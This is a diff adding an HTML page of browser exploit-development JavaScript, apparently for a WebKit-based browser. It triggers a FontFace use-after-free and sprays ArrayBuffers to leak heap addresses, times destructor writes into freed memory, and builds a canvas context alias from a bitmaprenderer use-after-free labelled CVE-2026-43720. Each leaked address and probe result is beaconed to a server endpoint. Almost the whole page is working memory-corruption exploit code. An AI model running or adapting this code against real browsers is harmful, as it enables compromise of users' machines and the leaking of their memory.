@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P841</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:90vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P841: Destructor Write Timing + Canvas Alias State Dump</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P841-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(biguint){return '0x'+biguint.toString(16).padStart(12,'0');}
+
+bn('BOOT','start');
+log('--- Phase A: FontFace UAF #1 (baseline) ---','hot');
+
+/* ===== PHASE A: First FontFace UAF — full 192B dump ===== */
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+var faceA=new FontFace('fA',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+void faceA.loaded;
+
+var fabsA=[],ffiredA=false;
+var phaseADone=false,H=BigInt(0),q13=BigInt(0);
+
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffiredA)return undefined;
+    ffiredA=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabsA=[];
+    for(var i=0;i<80;i++)fabsA.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bbA');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em fA, bbA','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabsA.length;i++){
+    var u=new Uint8Array(fabsA[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('MISS-A','nz='+bestNz);
+    log('Phase A miss (nz='+bestNz+'), reload...','fail');
+    setTimeout(function(){location.reload();},400);
+    return;
+  }
+
+  var abA=fabsA[bestI];
+  var buA=new BigUint64Array(abA);
+  var u8A=new Uint8Array(abA);
+
+  /* Full 24 qword dump */
+  var qDump=[];
+  for(var i=0;i<24;i++){
+    var v=buA[i];
+    if(v!==BigInt(0))qDump.push('q'+i+'='+hexQ(v));
+  }
+
+  var q11=buA[11];
+  q13=buA[13];
+  H=(q11!==BigInt(0))? q11-BigInt(0x68) : BigInt(0);
+  var Hstr=hexQ(H);
+
+  /* Nonzero byte map */
+  var nzMap=[];
+  for(var i=0;i<192;i++){
+    if(u8A[i]!==0)nzMap.push(i.toString(16)+':'+u8A[i].toString(16));
+  }
+
+  log('H='+Hstr+' q13='+hexQ(q13)+' nz='+bestNz,'ok');
+  log('Qwords: '+qDump.join(' '),'info');
+  log('NZ bytes: '+nzMap.join(' '),'info');
+  bn('PHASE-A','H='+Hstr+'|q13='+hexQ(q13)+'|nz='+bestNz+'|qd='+qDump.join(',')+'|nzmap='+nzMap.join(','));
+
+  phaseADone=true;
+  startPhaseB();
+}, 250);
+
+/* ===== PHASE B: Second FontFace UAF — destructor write timing ===== */
+function startPhaseB(){
+  log('','');
+  log('--- Phase B: Destructor Write Timing (0xBB fill) ---','hot');
+
+  var stB=document.createElement('style');
+  stB.textContent="@font-face{font-family:bbB;src:local(Arial);unicode-range:U+0043;}";
+  document.head.appendChild(stB);
+  var faceB=new FontFace('fB',"local('Helvetica')",{unicodeRange:'U+0043'});
+  document.fonts.add(faceB);
+  void faceB.loaded;
+
+  var fabsB=[],ffiredB=false;
+  var fillAB=null;
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffiredB)return undefined;
+      ffiredB=true;
+      if(stB){stB.remove();stB.textContent='';stB=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      fabsB=[];
+      for(var i=0;i<80;i++)fabsB.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bbB');}catch(e){}
+      document.body.offsetHeight;
+
+      /* IMMEDIATELY fill all ABs with 0xBB pattern */
+      for(var i=0;i<fabsB.length;i++){
+        var u=new Uint8Array(fabsB[i]);
+        for(var j=0;j<192;j++)u[j]=0xBB;
+      }
+
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em fB, bbB','CD');
+
+  /* Poll at increasing intervals */
+  var pollTimes=[1,2,5,10,20,50,100,200];
+  var pollIdx=0;
+  var snapshots=[];
+
+  function pollB(){
+    if(pollIdx>=pollTimes.length){finishPhaseB();return;}
+    var delay=pollTimes[pollIdx];
+    setTimeout(function(){
+      /* Find which ABs had bytes changed from 0xBB */
+      var bestChanges=0,bestABIdx=-1;
+      for(var i=0;i<fabsB.length;i++){
+        var u=new Uint8Array(fabsB[i]),ch=0;
+        for(var j=0;j<192;j++){if(u[j]!==0xBB)ch++;}
+        if(ch>bestChanges){bestChanges=ch;bestABIdx=i;}
+      }
+
+      var snap={t:delay,changes:bestChanges,idx:bestABIdx,bytes:[]};
+      if(bestABIdx>=0&&bestChanges>0){
+        var u=new Uint8Array(fabsB[bestABIdx]);
+        for(var j=0;j<192;j++){
+          if(u[j]!==0xBB)snap.bytes.push(j.toString(16)+':'+u[j].toString(16));
+        }
+      }
+      snapshots.push(snap);
+      pollIdx++;
+      pollB();
+    },delay-(pollIdx>0?pollTimes[pollIdx-1]:0));
+  }
+
+  /* Start polling after then getter fires */
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    pollB();
+  },0);
+
+  function finishPhaseB(){
+    var summaryB=[];
+    for(var i=0;i<snapshots.length;i++){
+      var s=snapshots[i];
+      summaryB.push('t'+s.t+'ms:ch='+s.changes+(s.bytes.length>0?'['+s.bytes.slice(0,10).join(',')+']':''));
+    }
+    log('Timing: '+summaryB.join(' | '),'info');
+    bn('PHASE-B',summaryB.join('||'));
+
+    /* Analyze: were writes from destructor or from initial data? */
+    var lastSnap=snapshots[snapshots.length-1];
+    if(lastSnap.changes===0){
+      log('No destructor writes detected (all 0xBB preserved)!','ok');
+      log('=> nonzero bytes in Phase A were PRE-EXISTING (bmalloc did not zero)','hot');
+      bn('DESTR','no-writes');
+    } else {
+      log(lastSnap.changes+' bytes changed from 0xBB — destructor IS writing to freed memory','hot');
+      bn('DESTR','writes='+lastSnap.changes+'|bytes='+lastSnap.bytes.slice(0,20).join(','));
+    }
+
+    startPhaseC();
+  }
+}
+
+/* ===== PHASE C: Canvas Alias — Deep State Property Map ===== */
+function startPhaseC(){
+  log('','');
+  log('--- Phase C: Canvas Alias State Map ---','hot');
+
+  /* CVE-2026-43720: bitmaprenderer outer + Object.defineProperty alpha trap + 2d inner */
+  var aliasCtx=null,victimCtx=null;
+  var canvasAlias=null;
+
+  try{
+    /* Step 1: Create victim canvas (outer) */
+    canvasAlias=document.createElement('canvas');
+    canvasAlias.width=64;canvasAlias.height=64;
+    document.body.appendChild(canvasAlias);
+
+    /* Step 2: Get bitmaprenderer context with alpha trap */
+    var bmrCtx=null;
+    var origGetter=Object.getOwnPropertyDescriptor(HTMLCanvasElement.prototype,'getContext')||
+                   Object.getOwnPropertyDescriptor(canvasAlias.__proto__,'getContext');
+
+    /* Use defineProperty on the options to trap when getContext reads 'alpha' */
+    var opts={};
+    var triggered=false;
+    Object.defineProperty(opts,'alpha',{
+      get:function(){
+        if(!triggered){
+          triggered=true;
+          /* During bitmaprenderer init, get 2d context -> frees bitmaprenderer (768B) */
+          try{victimCtx=canvasAlias.getContext('2d');}catch(e){}
+        }
+        return true;
+      }
+    });
+
+    bmrCtx=canvasAlias.getContext('bitmaprenderer',opts);
+
+    if(!victimCtx){
+      log('Alias setup failed: no victimCtx','fail');
+      bn('ALIAS','fail-no-victim');
+      startPhaseD();
+      return;
+    }
+
+    /* Step 3: Spray 200 Canvas2D to reclaim 768B */
+    var sprayCanvases=[];
+    for(var i=0;i<200;i++){
+      var sc=document.createElement('canvas');
+      sc.width=4;sc.height=4;
+      var sctx=sc.getContext('2d');
+      sprayCanvases.push({c:sc,ctx:sctx});
+    }
+
+    /* Step 4: Test alias — set on victim, read on spray canvases */
+    victimCtx.fillStyle='#FF3300';
+    victimCtx.lineWidth=7.77;
+    victimCtx.globalAlpha=0.42;
+    victimCtx.setLineDash([11.11,22.22,33.33]);
+    victimCtx.lineDashOffset=44.44;
+    victimCtx.shadowBlur=5.55;
+    victimCtx.shadowColor='rgba(100,200,50,0.8)';
+    victimCtx.miterLimit=8.88;
+
+    var aliasFound=-1;
+    for(var i=0;i<sprayCanvases.length;i++){
+      var sctx=sprayCanvases[i].ctx;
+      try{
+        if(sctx.lineWidth===7.77&&sctx.globalAlpha>0.41&&sctx.globalAlpha<0.43){
+          aliasFound=i;
+          aliasCtx=sctx;
+          break;
+        }
+      }catch(e){}
+    }
+
+    if(aliasFound<0){
+      log('No canvas alias found in 200 spray','fail');
+      bn('ALIAS','miss');
+      startPhaseD();
+      return;
+    }
+
+    log('Canvas alias found at spray['+aliasFound+']!','ok');
+    bn('ALIAS-OK','idx='+aliasFound);
+
+    /* Step 5: Deep property dump through alias */
+    var props={};
+    try{props.fillStyle=aliasCtx.fillStyle;}catch(e){props.fillStyle='ERR';}
+    try{props.strokeStyle=aliasCtx.strokeStyle;}catch(e){props.strokeStyle='ERR';}
+    try{props.lineWidth=aliasCtx.lineWidth;}catch(e){props.lineWidth='ERR';}
+    try{props.lineCap=aliasCtx.lineCap;}catch(e){props.lineCap='ERR';}
+    try{props.lineJoin=aliasCtx.lineJoin;}catch(e){props.lineJoin='ERR';}
+    try{props.miterLimit=aliasCtx.miterLimit;}catch(e){props.miterLimit='ERR';}
+    try{props.lineDash=JSON.stringify(aliasCtx.getLineDash());}catch(e){props.lineDash='ERR';}
+    try{props.lineDashOffset=aliasCtx.lineDashOffset;}catch(e){props.lineDashOffset='ERR';}
+    try{props.shadowBlur=aliasCtx.shadowBlur;}catch(e){props.shadowBlur='ERR';}
+    try{props.shadowColor=aliasCtx.shadowColor;}catch(e){props.shadowColor='ERR';}
+    try{props.globalAlpha=aliasCtx.globalAlpha;}catch(e){props.globalAlpha='ERR';}
+    try{props.gco=aliasCtx.globalCompositeOperation;}catch(e){props.gco='ERR';}
+    try{props.font=aliasCtx.font;}catch(e){props.font='ERR';}
+    try{props.textAlign=aliasCtx.textAlign;}catch(e){props.textAlign='ERR';}
+    try{props.textBaseline=aliasCtx.textBaseline;}catch(e){props.textBaseline='ERR';}
+    try{props.direction=aliasCtx.direction;}catch(e){props.direction='ERR';}
+    try{props.imageSmoothingEnabled=aliasCtx.imageSmoothingEnabled;}catch(e){props.imageSmoothingEnabled='ERR';}
+    try{var t=aliasCtx.getTransform();props.transform='a='+t.a+',b='+t.b+',c='+t.c+',d='+t.d+',e='+t.e+',f='+t.f;}catch(e){props.transform='ERR';}
+
+    var pStr='';
+    for(var k in props)pStr+=k+'='+props[k]+' | ';
+    log('Alias sees: '+pStr,'info');
+    bn('ALIAS-PROPS',pStr.slice(0,800));
+
+    /* Step 6: Bidirectional test — set on alias, read on victim */
+    aliasCtx.fillStyle='#00FF99';
+    aliasCtx.lineWidth=99.99;
+    aliasCtx.setLineDash([100,200]);
+    aliasCtx.globalAlpha=0.77;
+
+    var bidir={};
+    bidir.vFill=victimCtx.fillStyle;
+    bidir.vLW=victimCtx.lineWidth;
+    bidir.vLD=JSON.stringify(victimCtx.getLineDash());
+    bidir.vAlpha=victimCtx.globalAlpha;
+    log('Bidir: victim.fill='+bidir.vFill+' lw='+bidir.vLW+' ld='+bidir.vLD+' alpha='+bidir.vAlpha,'info');
+    bn('BIDIR',JSON.stringify(bidir));
+
+    /* Step 7: save/restore interaction test */
+    victimCtx.fillStyle='#AABB00';
+    victimCtx.save();
+    aliasCtx.fillStyle='#DD1122';
+    var afterSave=victimCtx.fillStyle;
+    victimCtx.restore();
+    var afterRestore=victimCtx.fillStyle;
+    log('Save/Restore: afterSave='+afterSave+' afterRestore='+afterRestore,'info');
+    bn('SAVERESTORE','save='+afterSave+'|restore='+afterRestore);
+
+    /* Step 8: lineDash pointer experiment */
+    /* Set a large lineDash on victim, then read raw values through alias */
+    victimCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12]);
+    var aliasDash=aliasCtx.getLineDash();
+    log('12-elem dash through alias: len='+aliasDash.length+' ['+aliasDash.slice(0,6).map(function(v){return v.toFixed(2);}).join(',')+',...]','info');
+
+    /* Set lineDash on alias to values that encode address bytes (DAZ test) */
+    /* Use small integers that encode q13 bytes */
+    if(q13!==BigInt(0)){
+      var q13bytes=[];
+      var tmp=q13;
+      for(var i=0;i<8;i++){
+        q13bytes.push(Number(tmp&BigInt(0xFF)));
+        tmp=tmp>>BigInt(8);
+      }
+      aliasCtx.setLineDash(q13bytes.map(function(b){return b+0.5;}));
+      var victimReadback=victimCtx.getLineDash();
+      log('q13 byte encode through dash: set='+q13bytes.join(',')+' read='+victimReadback.map(function(v){return v.toFixed(1);}).join(','),'info');
+      bn('DASH-ENCODE','set='+q13bytes.join(',')+'|read='+victimReadback.join(','));
+    }
+
+    /* Step 9: Gradient object through alias */
+    try{
+      var grad=aliasCtx.createLinearGradient(0,0,64,64);
+      grad.addColorStop(0,'red');
+      grad.addColorStop(1,'blue');
+      aliasCtx.fillStyle=grad;
+
+      var victimFill=victimCtx.fillStyle;
+      var isGradient=(typeof victimFill==='object');
+      log('Gradient through alias: victim.fillStyle type='+(typeof victimFill)+' isGrad='+isGradient,'info');
+      if(isGradient){
+        /* Try to extract info from gradient object */
+        var gStr=String(victimFill);
+        var gKeys=[];try{gKeys=Object.getOwnPropertyNames(victimFill);}catch(e){}
+        log('  Gradient: str='+gStr+' keys=['+gKeys.join(',')+']','info');
+        bn('GRADIENT','type='+(typeof victimFill)+'|str='+gStr+'|keys='+gKeys.join(','));
+      } else {
+        bn('GRADIENT','type='+(typeof victimFill)+'|val='+victimFill);
+      }
+    }catch(e){
+      log('Gradient test error: '+e.message,'fail');
+      bn('GRADIENT-ERR',e.message);
+    }
+
+    /* Step 10: createPattern through alias */
+    try{
+      var patC=document.createElement('canvas');
+      patC.width=8;patC.height=8;
+      var patCtx=patC.getContext('2d');
+      patCtx.fillStyle='#F0F';patCtx.fillRect(0,0,8,8);
+      var pat=aliasCtx.createPattern(patC,'repeat');
+      aliasCtx.fillStyle=pat;
+
+      var victimPat=victimCtx.fillStyle;
+      log('Pattern through alias: type='+(typeof victimPat),'info');
+      bn('PATTERN','type='+(typeof victimPat));
+    }catch(e){
+      log('Pattern test error: '+e.message,'fail');
+    }
+
+  }catch(e){
+    log('Canvas alias error: '+e.message,'fail');
+    bn('ALIAS-ERR',e.message);
+  }
+
+  startPhaseD();
+}
+
+/* ===== PHASE D: Creative explorations ===== */
+function startPhaseD(){
+  log('','');
+  log('--- Phase D: Creative explorations ---','hot');
+
+  /* D1: FinalizationRegistry + WeakRef timing for GC detection */
+  try{
+    var gcDetected=false;
+    var fr=new FinalizationRegistry(function(val){
+      gcDetected=true;
+      bn('GC-FIRE','val='+val);
+      log('FinalizationRegistry fired! val='+val,'hot');
+    });
+    var target={marker:'GC_PROBE'};
+    var wr=new WeakRef(target);
+    fr.register(target,'gc_probe_1');
+    target=null; /* Drop strong ref */
+
+    /* GC pressure */
+    var junk=[];
+    for(var i=0;i<5000;i++)junk.push(new ArrayBuffer(1024));
+    junk=null;
+    for(var i=0;i<5000;i++)(function(){var x=new ArrayBuffer(2048);})();
+
+    /* Check WeakRef */
+    var wrAlive=(wr.deref()!==undefined);
+    log('D1: WeakRef alive after GC pressure: '+wrAlive,'info');
+    bn('WEAKREF','alive='+wrAlive);
+  }catch(e){
+    log('D1 error: '+e.message,'fail');
+  }
+
+  /* D2: console.memory / performance.measureUserAgentSpecificMemory */
+  try{
+    var memInfo='';
+    if(typeof performance.measureUserAgentSpecificMemory==='function'){
+      performance.measureUserAgentSpecificMemory().then(function(r){
+        bn('MEM-API',JSON.stringify(r).slice(0,400));
+        log('D2: measureMemory = '+JSON.stringify(r).slice(0,200),'hot');
+      }).catch(function(e){
+        bn('MEM-API-ERR',e.message);
+      });
+      memInfo+='measureMemory=exists';
+    }
+    if(window.crossOriginIsolated!==undefined){
+      memInfo+='|COI='+window.crossOriginIsolated;
+    }
+    log('D2: '+memInfo,'info');
+    bn('MEM-PROBE',memInfo);
+  }catch(e){
+    log('D2 error: '+e.message,'fail');
+  }
+
+  /* D3: Error prepareStackTrace (V8-style, unlikely on JSC but worth trying) */
+  try{
+    var stackInfo='';
+    if(Error.captureStackTrace){
+      stackInfo+='captureStackTrace=YES';
+    }
+    if(Error.prepareStackTrace!==undefined){
+      stackInfo+='|prepareStackTrace=YES';
+    }
+    /* Try JSC-specific: Error.stackTraceLimit */
+    stackInfo+='|stackTraceLimit='+Error.stackTraceLimit;
+    /* Try to get structured stack */
+    try{
+      var err=new Error('test');
+      var raw=err.stack;
+      /* Look for any hex addresses */
+      var hexes=raw.match(/0x[0-9a-f]{6,}/gi);
+      if(hexes&&hexes.length>0){
+        stackInfo+='|HEX_IN_STACK='+hexes.join(',');
+        log('D3: ADDRESSES IN STACK! '+hexes.join(', '),'hot');
+      } else {
+        stackInfo+='|no_hex_in_stack';
+      }
+    }catch(e2){}
+    log('D3: '+stackInfo,'info');
+    bn('STACK-PROBE',stackInfo);
+  }catch(e){
+    log('D3 error: '+e.message,'fail');
+  }
+
+  /* D4: Worker SharedArrayBuffer probe (last resort) */
+  try{
+    var sabAvail=typeof SharedArrayBuffer!=='undefined';
+    log('D4: SharedArrayBuffer='+(sabAvail?'YES':'NO'),'info');
+
+    /* Test if Atomics.waitAsync works as timing oracle */
+    if(!sabAvail){
+      var testAB=new ArrayBuffer(8);
+      var i32=new Int32Array(testAB);
+      i32[0]=0;
+      try{
+        var waResult=Atomics.waitAsync(i32,0,0,1);
+        log('D4: waitAsync on regular AB: '+JSON.stringify(waResult),'info');
+        bn('WAITASYNC',JSON.stringify(waResult));
+      }catch(e2){
+        log('D4: waitAsync error: '+e2.message,'info');
+        bn('WAITASYNC-ERR',e2.message);
+      }
+    }
+  }catch(e){
+    log('D4 error: '+e.message,'fail');
+  }
+
+  /* D5: ArrayBuffer.prototype.transfer existence */
+  try{
+    var transAB=new ArrayBuffer(16);
+    var hasTransfer=typeof transAB.transfer==='function';
+    var hasResize=typeof transAB.resize==='function';
+    var hasSlice=typeof transAB.slice==='function';
+    var hasResizable='maxByteLength' in ArrayBuffer.prototype||false;
+    log('D5: transfer='+hasTransfer+' resize='+hasResize+' slice='+hasSlice+' resizable='+hasResizable,'info');
+    bn('AB-CAPS','transfer='+hasTransfer+'|resize='+hasResize+'|slice='+hasSlice+'|resizable='+hasResizable);
+
+    /* If resizable, test it */
+    if(hasResizable){
+      try{
+        var rab=new ArrayBuffer(64,{maxByteLength:1024});
+        log('D5: Resizable AB created! byteLength='+rab.byteLength+' maxByteLength='+rab.maxByteLength,'hot');
+        bn('RAB','len='+rab.byteLength+'|max='+rab.maxByteLength);
+
+        /* Can we grow it? */
+        try{
+          rab.resize(256);
+          log('D5: Resized to '+rab.byteLength,'hot');
+          bn('RAB-RESIZE','newlen='+rab.byteLength);
+        }catch(e2){
+          log('D5: Resize failed: '+e2.message,'info');
+          bn('RAB-RESIZE-ERR',e2.message);
+        }
+      }catch(e2){
+        log('D5: Resizable AB creation failed: '+e2.message,'info');
+        bn('RAB-ERR',e2.message);
+      }
+    }
+  }catch(e){
+    log('D5 error: '+e.message,'fail');
+  }
+
+  /* Finish */
+  setTimeout(function(){
+    log('','');
+    log('====== P841 COMPLETE ======','hot');
+    bn('DONE','H='+hexQ(H)+'|q13='+hexQ(q13));
+  },500);
+}
+</script></body></html>
